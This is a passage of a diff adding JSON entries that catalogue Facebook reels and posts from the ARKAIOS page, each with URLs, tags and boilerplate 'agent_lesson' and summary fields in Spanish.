+    "summary": "Solo firma en comentarios con tu @\"nombre\" y listo!!!.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/26545599561729870/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/26545599561729870/"
+  },
+  {
+    "id": "meta-776644758860856_122174711786989266",
+    "title": "ARKAIOS Reel #1544938987359977",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1544938987359977/",
+    "canonical_url": "https://www.facebook.com/reel/1544938987359977/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1544938987359977/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1544938987359977/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1544938987359977/"
+  },
+  {
+    "id": "meta-776644758860856_122174710478989266",
+    "title": "ARKAIOS Reel #1081938387832798",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1081938387832798/",
+    "canonical_url": "https://www.facebook.com/reel/1081938387832798/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1081938387832798/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1081938387832798/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1081938387832798/"
+  },
+  {
+    "id": "meta-776644758860856_122174710124989266",
+    "title": "ARKAIOS Reel #2135588753971513",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2135588753971513/",
+    "canonical_url": "https://www.facebook.com/reel/2135588753971513/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2135588753971513/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2135588753971513/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2135588753971513/"
+  },
+  {
+    "id": "meta-776644758860856_122174643236989266",
+    "title": "ARKAIOS Reel #813571861817993",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/813571861817993/",
+    "canonical_url": "https://www.facebook.com/reel/813571861817993/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/813571861817993/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/813571861817993/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/813571861817993/"
+  },
+  {
+    "id": "meta-776644758860856_122174623844989266",
+    "title": "votanos en:",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122174623766989266&set=a.122111211968989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122174623766989266&set=a.122111211968989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122174623766989266&set=a.122111211968989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "votanos en:\nhttps://launchorbit.co/product/0050b35f-5db9-461f-bdb7-bc0de67127cd",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: votanos en:\nhttps://launchorbit.co/product/0050b35f-5db9-461f-bdb7-bc0de67127cd...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122174623766989266&set=a.122111211968989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122174618108989266",
+    "title": "Agente Builder 24/7 Concocelo!!!:",
+    "category": "Multi-Agent Intelligence & MCP",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122174618078989266&set=a.122111211968989266&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122174618078989266&set=a.122111211968989266&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122174618078989266&set=a.122111211968989266&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Agente Builder 24/7 Concocelo!!!:\nhttps://arkaios-revenue-engine.vercel.app/",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Agente Builder 24/7 Concocelo!!!:\nhttps://arkaios-revenue-engine.vercel.app/...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122174618078989266&set=a.122111211968989266&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122174493524989266",
+    "title": "ARKAIOS Reel #2589791471467677",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2589791471467677/",
+    "canonical_url": "https://www.facebook.com/reel/2589791471467677/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2589791471467677/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2589791471467677/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2589791471467677/"
+  },
+  {
+    "id": "meta-776644758860856_122174493278989266",
+    "title": "ARKAIOS Reel #1736854610861192",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1736854610861192/",
+    "canonical_url": "https://www.facebook.com/reel/1736854610861192/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1736854610861192/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1736854610861192/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1736854610861192/"
+  },
+  {
+    "id": "meta-776644758860856_122174491358989266",
+    "title": "El contenido no está disponible en este momento",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/122178342368989266/posts/122174491358989266",
+    "canonical_url": "https://www.facebook.com/122178342368989266/posts/122174491358989266",
+    "github_repo": null,
+    "website": null,
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/122178342368989266/posts/122174491358989266"
+  },
+  {
+    "id": "meta-776644758860856_122174230916989266",
+    "title": "Publicación Oficial ARKAIOS #122174230916989266",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=122140447569235406&set=a.122096913687235406&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=122140447569235406&set=a.122096913687235406&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=122140447569235406&set=a.122096913687235406&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=122140447569235406&set=a.122096913687235406&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122174224802989266",
+    "title": "ARKAIOS Reel #1762328625018007",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1762328625018007/",
+    "canonical_url": "https://www.facebook.com/reel/1762328625018007/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1762328625018007/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1762328625018007/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1762328625018007/"
+  },
+  {
+    "id": "meta-776644758860856_122173977764989266",
+    "title": "ARKAIOS Reel #1063807882774107",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1063807882774107/",
+    "canonical_url": "https://www.facebook.com/reel/1063807882774107/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1063807882774107/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1063807882774107/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1063807882774107/"
+  },
+  {
+    "id": "meta-776644758860856_122173977062989266",
+    "title": "ARKAIOS Reel #4396786370533461",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/4396786370533461/",
+    "canonical_url": "https://www.facebook.com/reel/4396786370533461/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/4396786370533461/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/4396786370533461/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/4396786370533461/"
+  },
+  {
+    "id": "meta-776644758860856_122173976474989266",
+    "title": "ARKAIOS Reel #986393444150092",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/986393444150092/",
+    "canonical_url": "https://www.facebook.com/reel/986393444150092/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/986393444150092/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/986393444150092/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/986393444150092/"
+  },
+  {
+    "id": "meta-776644758860856_122173975706989266",
+    "title": "Haz tu pc mas rapida #vamosatestearlo #pacoweb",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1842030439776337/",
+    "canonical_url": "https://www.facebook.com/reel/1842030439776337/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1842030439776337/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1842030439776337/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1842030439776337/"
+  },
+  {
+    "id": "meta-776644758860856_122173975400989266",
+    "title": "ARKAIOS Reel #1767158264281118",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1767158264281118/",
+    "canonical_url": "https://www.facebook.com/reel/1767158264281118/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1767158264281118/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1767158264281118/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1767158264281118/"
+  },
+  {
+    "id": "meta-776644758860856_122173974854989266",
+    "title": "ARKAIOS Reel #1391602629108762",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1391602629108762/",
+    "canonical_url": "https://www.facebook.com/reel/1391602629108762/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1391602629108762/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1391602629108762/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1391602629108762/"
+  },
+  {
+    "id": "meta-776644758860856_122173864886989266",
+    "title": "Fotos de la publicación de a꙲    r꙲    k꙲    a꙲    i꙲    o꙲    s꙲",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/122178342368989266/posts/122173864886989266",
+    "canonical_url": "https://www.facebook.com/122178342368989266/posts/122173864886989266",
+    "github_repo": null,
+    "website": "https://www.facebook.com/122178342368989266/posts/122173864886989266",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: ...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/122178342368989266/posts/122173864886989266"
+  },
+  {
+    "id": "meta-776644758860856_122173863704989266",
+    "title": "ARKAIOS Reel #2199259710640840",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2199259710640840/",
+    "canonical_url": "https://www.facebook.com/reel/2199259710640840/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2199259710640840/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2199259710640840/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2199259710640840/"
+  },
+  {
+    "id": "meta-776644758860856_122173725188989266",
+    "title": "ARKAIOS Pay - MRR, Ingresos y Análisis | Facto | Facto",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://l.facebook.com/l.php?u=https%3A%2F%2Ffactosaas.com%2Fsaas%2Farkaios-pay&h=AUDSHPV1Zi7GgJ86zpktFw7igdmV_rpTbxbf2wfpayZtkUHjADBdf8s9-CdeUgxx5OpWPVvl0KxNW0ggn9MpjjcDqFEyJhf6Xe7sT3rV5sPAxVrGQKDRyPTssRO2QFJVKGrdg2_ylWZblFbC&s=1",
+    "canonical_url": "https://l.facebook.com/l.php?u=https%3A%2F%2Ffactosaas.com%2Fsaas%2Farkaios-pay&h=AUDSHPV1Zi7GgJ86zpktFw7igdmV_rpTbxbf2wfpayZtkUHjADBdf8s9-CdeUgxx5OpWPVvl0KxNW0ggn9MpjjcDqFEyJhf6Xe7sT3rV5sPAxVrGQKDRyPTssRO2QFJVKGrdg2_ylWZblFbC&s=1",
+    "github_repo": null,
+    "website": "https://l.facebook.com/l.php?u=https%3A%2F%2Ffactosaas.com%2Fsaas%2Farkaios-pay&h=AUDSHPV1Zi7GgJ86zpktFw7igdmV_rpTbxbf2wfpayZtkUHjADBdf8s9-CdeUgxx5OpWPVvl0KxNW0ggn9MpjjcDqFEyJhf6Xe7sT3rV5sPAxVrGQKDRyPTssRO2QFJVKGrdg2_ylWZblFbC&s=1",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "Ahora ARKAIOS Pay está en Facto 🚀",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: Ahora ARKAIOS Pay está en Facto 🚀\n...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://l.facebook.com/l.php?u=https%3A%2F%2Ffactosaas.com%2Fsaas%2Farkaios-pay&h=AUDSHPV1Zi7GgJ86zpktFw7igdmV_rpTbxbf2wfpayZtkUHjADBdf8s9-CdeUgxx5OpWPVvl0KxNW0ggn9MpjjcDqFEyJhf6Xe7sT3rV5sPAxVrGQKDRyPTssRO2QFJVKGrdg2_ylWZblFbC&s=1"
+  },
+  {
+    "id": "meta-776644758860856_122173700510989266",
+    "title": "ARKAIOS Reel #1383315677289194",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1383315677289194/",
+    "canonical_url": "https://www.facebook.com/reel/1383315677289194/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1383315677289194/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1383315677289194/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1383315677289194/"
+  },
+  {
+    "id": "meta-776644758860856_122173388006989266",
+    "title": "ARKAIOS Reel #1687111295841727",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1687111295841727/",
+    "canonical_url": "https://www.facebook.com/reel/1687111295841727/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1687111295841727/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1687111295841727/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1687111295841727/"
+  },
+  {
+    "id": "meta-776644758860856_122173186478989266",
+    "title": "ARKAIOS Reel #1105279728709537",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1105279728709537/",
+    "canonical_url": "https://www.facebook.com/reel/1105279728709537/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1105279728709537/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1105279728709537/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1105279728709537/"
+  },
+  {
+    "id": "meta-776644758860856_122173178894989266",
+    "title": "ARKAIOS Reel #1320497436339703",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1320497436339703/",
+    "canonical_url": "https://www.facebook.com/reel/1320497436339703/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1320497436339703/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1320497436339703/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1320497436339703/"
+  },
+  {
+    "id": "meta-776644758860856_122173014746989266",
+    "title": "No entienden ni entenderan que el corazon humano real no nesesita dinero sino al ser humano ( a su projimo realmente)",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Graph API Official)",
+    "original_url": "https://www.facebook.com/photo.php?fbid=1505491051614967&set=a.544996717664410&type=3",
+    "canonical_url": "https://www.facebook.com/photo.php?fbid=1505491051614967&set=a.544996717664410&type=3",
+    "github_repo": null,
+    "website": "https://www.facebook.com/photo.php?fbid=1505491051614967&set=a.544996717664410&type=3",
+    "technologies": [],
+    "skills_unlocked": [],
+    "summary": "No entienden ni entenderan que el corazon humano real no nesesita dinero sino al ser humano ( a su projimo realmente)",
+    "agent_lesson": "Lección oficial asimilada desde la página ARKAIOS: No entienden ni entenderan que el corazon humano real no nesesita dinero sino al ser humano ( a su projimo realmente)...",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "post"
+    ],
+    "external_resource": "https://www.facebook.com/photo.php?fbid=1505491051614967&set=a.544996717664410&type=3"
+  },
+  {
+    "id": "meta-776644758860856_122172893540989266",
+    "title": "https://www.facebook.com/share/r/1UuZfBtyMZ/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2137693633792402/",
+    "canonical_url": "https://www.facebook.com/reel/2137693633792402/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2137693633792402/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://www.facebook.com/share/r/1UuZfBtyMZ/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2137693633792402/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2137693633792402/"
+  },
+  {
+    "id": "meta-776644758860856_122172866906989266",
+    "title": "Esperemos no le pase como al otro que mostramos 2 dias despues de darle foco en facebook lo mataron y robaron sus invent",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/2167712047119423/",
+    "canonical_url": "https://www.facebook.com/reel/2167712047119423/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/2167712047119423/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Esperemos no le pase como al otro que mostramos 2 dias despues de darle foco en facebook lo mataron y robaron sus inventos y patentes,,, https://www.facebook.com/share/v/1U2xwdhw4j/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/2167712047119423/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/2167712047119423/"
+  },
+  {
+    "id": "meta-776644758860856_122172782234989266",
+    "title": "ARKAIOS Reel #1575659777575306",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1575659777575306/",
+    "canonical_url": "https://www.facebook.com/reel/1575659777575306/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1575659777575306/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/1575659777575306/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/1575659777575306/"
+  },
+  {
+    "id": "meta-776644758860856_122172778652989266",
+    "title": "Truco del Bluetooth que nadie sabe",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/954979766861437/",
+    "canonical_url": "https://www.facebook.com/reel/954979766861437/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/954979766861437/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "Contenido oficial sincronizado directamente desde Meta Graph API.",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/954979766861437/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/954979766861437/"
+  },
+  {
+    "id": "meta-776644758860856_122172634046989266",
+    "title": "https://www.facebook.com/share/v/18PAGgpmBn/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/3629465703877812/",
+    "canonical_url": "https://www.facebook.com/reel/3629465703877812/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/3629465703877812/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
+    "summary": "https://www.facebook.com/share/v/18PAGgpmBn/",
+    "agent_lesson": "Registro audiovisual oficial verificado de la fanpage ARKAIOS (https://www.facebook.com/reel/3629465703877812/). Analizable para visión por computadora y transcripción.",
+    "tags": [
+      "meta-graph-api",
+      "arkaios-official",
+      "video"
+    ],
+    "external_resource": "https://www.facebook.com/reel/3629465703877812/"
+  },
+  {
+    "id": "meta-776644758860856_122172626420989266",
+    "title": "https://www.facebook.com/share/r/19kiQztGEG/",
+    "category": "Sovereign Knowledge & Systems",
+    "platform": "Facebook (Reel / Video Official)",
+    "original_url": "https://www.facebook.com/reel/1802311681202995/",
+    "canonical_url": "https://www.facebook.com/reel/1802311681202995/",
+    "github_repo": null,
+    "website": "https://www.facebook.com/reel/1802311681202995/",
+    "technologies": [
+      "Multimedia",
+      "Reel"
+    ],
+    "skills_unlocked": [
+      "Transmisión Multimedia Soberana"
+    ],
